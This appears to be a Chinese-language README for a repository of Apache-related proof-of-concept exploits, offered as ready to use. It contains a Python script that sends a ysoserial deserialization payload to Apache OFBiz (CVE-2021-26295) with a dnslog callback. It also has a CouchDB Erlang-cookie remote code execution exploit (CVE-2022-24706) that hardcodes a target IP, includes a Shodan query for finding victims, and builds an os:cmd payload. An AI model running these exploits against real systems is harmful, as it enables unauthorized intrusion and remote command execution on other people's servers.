# Apache_poc
 大部分代码经注释，到手即可使用和二次编写
请勿用于非法用途，造成一切后果自行承担！！！

## 展示部分代码

```漏洞名称:Apache OFBiz rmi反序列化（CVE-2021-26295 ）  
功能：单个检测，批量检测
说明：依赖ysoserial，请将ysoserial.jar放到与本脚本同一目录                                     
单个检测：python poc.py -u url -d domain
批量检测：python poc.py -f 1.txt
+-----------------------------------------------------------------+                                     
''')

    def trans(self, dnslog_url):
        cmd = subprocess.Popen(
            f'java -jar .\ysoserial.jar URLDNS {dnslog_url}',
            bufsize=0,
            executable=None,
            stdin=None,
            stdout=subprocess.PIPE,
            stderr=None,
            preexec_fn=None,
            close_fds=False,
            shell=True)
        #读取输出内容
        data = cmd.stdout.read()
        #字符转换
        hex_data = binascii.hexlify(data).decode("utf-8")
        return hex_data

    #漏洞检测
    def poc(self, target_url, hex_data):
        url = f'{target_url}/webtools/control/SOAPService'
        headers = {'Content-Type': 'text/xml'}
        data = f'''<?xml version='1.0' encoding='UTF-8'?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><ying:clearAllEntityCaches xmlns:ying="http://ofbiz.apache.org/service/"><ying:cus-obj>{hex_data}</ying:cus-obj></ying:clearAllEntityCaches></soapenv:Body></soapenv:Envelope>'''
        try:
            res = requests.post(url=url,
                                headers=headers,
                                data=data,
                                verify=False,
                                timeout=10)
            return res.status_code
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)

    #随机获取域名
    def dnslog_getdomain(self, session):
        url = 'http://www.dnslog.cn/getdomain.php?t=0'
        try:
            res = session.get(url, verify=False, timeout=10)
            return res.text
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
```

```
 Based on 1F98D's Erlang Cookie - Remote Code Execution
# Shodan: port:4369 "name couchdb at"
# CVE: CVE-2022-24706
# References:
#  https://habr.com/ru/post/661195/
#  https://www.exploit-db.com/exploits/49418
#  https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/
#  https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#erlang-cookie-rce
#
#
# !/usr/local/bin/python3

import socket
from hashlib import md5
import struct
import sys
import re
import time
from weakref import proxy

TARGET = '130.15.85.153'
EPMD_PORT = 4369  # Default Erlang distributed port
COOKIE = "monster"  # Default Erlang cookie for CouchDB
ERLNAG_PORT = 0
EPM_NAME_CMD = b"\x00\x01\x6e"  # Request for nodes list

# Some data:
NAME_MSG = b"\x00\x15n\x00\x07\x00\x03\x49\x9cAAAAAA@AAAAAAA"
CHALLENGE_REPLY = b"\x00\x15r\x01\x02\x03\x04"
CTRL_DATA = b"\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03"
CTRL_DATA += b"\x00\x00\x00\x00\x00w\x00w\x03rex"


def compile_cmd(CMD):
    MSG = b"\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00"
    MSG += b"\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k"
    MSG += struct.pack(">H", len(CMD))
    MSG += bytes(CMD, 'ascii')
    MSG += b'jw\x04user'
    PAYLOAD = b'\x70' + CTRL_DATA + MSG
    PAYLOAD = struct.pack('!I', len(PAYLOAD)) + PAYLOAD
    return PAYLOAD


print("Remote Command Execution via Erlang Distribution Protocol.\n")

while not TARGET:
    TARGET = input("Enter target host:\n> ")

# Connect to EPMD:
try:
    epm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    epm_socket.connect((TARGET, EPMD_PORT))
except socket.error as msg:
    print("Couldnt connect to EPMD: %s\n terminating program" % msg)
    sys.exit(1)

epm_socket.send(EPM_NAME_CMD)  # request Erlang nodes
if epm_socket.recv(4) == b'\x00\x00\x11\x11':  # OK
    data = epm_socket.recv(1024)
    data = data[0:len(data) - 1].decode('ascii')
    data = data.split("\n")
    if len(data) == 1:
        choise = 1
        print("Found " + data[0])
    else:
        print("\nMore than one node found, choose which one to use:")
        line_number = 0
        for line in data:
            line_number += 1
            print(" %d) %s" % (line_number, line))
        choise = int(input("\n> "))

    ERLNAG_PORT = int(re.search("\d+$", data[choise - 1])[0])
else:
    print("Node list request error, exiting")
    sys.exit(1)
epm_socket.close()

# Connect to Erlang port:
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET, ERLNAG_PORT))
except socket.error as msg:
    print("Couldnt connect to Erlang server: %s\n terminating program" % msg)
    sys.exit(1)

```


此文件为开源免费资源，禁止商业用途！！

您的支持，是我们的动力！！

# 有疑问？怎么联系我们？
## Email：zc15108962790@163.com

# 如果您有更好的验证脚本方案，欢迎您与我们一同分享！！



